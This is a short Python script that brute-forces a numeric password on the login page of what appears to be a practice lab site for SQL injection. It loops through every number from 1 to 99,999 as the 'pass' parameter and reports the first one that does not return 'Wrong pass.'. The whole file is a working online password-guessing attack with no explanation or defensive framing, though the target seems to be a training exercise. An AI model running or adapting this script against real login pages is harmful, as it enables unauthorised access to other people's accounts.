import requests
from termcolor import cprint
url="https://www.zixem.altervista.org/SQLi/login_do.php?pass="
passwords=[]
password=""
expression="Wrong pass."
for i in range(1,100000):
    passwords.append(i)

for i in range(1,len(passwords)+1):
    with requests.Session() as sess:
        r = sess.get(f"https://www.zixem.altervista.org/SQLi/login_do.php?pass={i}")
        if expression in  r.text:
            cprint(f"[-] Still searching...({i})", 'red')
        else:
            cprint(f'[+]Correct password found: {i}', 'green')
            exit(0)










